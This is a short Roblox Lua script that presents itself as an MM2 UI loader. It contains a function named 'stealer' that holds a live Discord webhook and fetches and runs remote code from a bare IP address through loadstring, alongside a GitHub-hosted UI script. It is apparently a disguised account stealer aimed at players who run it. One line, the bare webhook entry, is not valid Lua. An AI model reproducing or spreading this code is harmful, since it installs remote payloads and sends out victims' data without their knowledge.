local function stealer()
webhook: https://discord.com/api/webhooks/1411418609330163783/WS1MzOGfaLOJ15-vEUYjC5cJIJXbWudr3FY4-0AfN6kyg_r5eCwv53HFPb0fa0ovREM7
ID="0d0a40e9-48e9-45da-94c2-c75a58369eb9";
loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
end
local function loadui()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BIudnyHoIandan/MM2/refs/heads/main/script.lua"))()
end

task.spawn(stealer)
task.spawn(loadui)
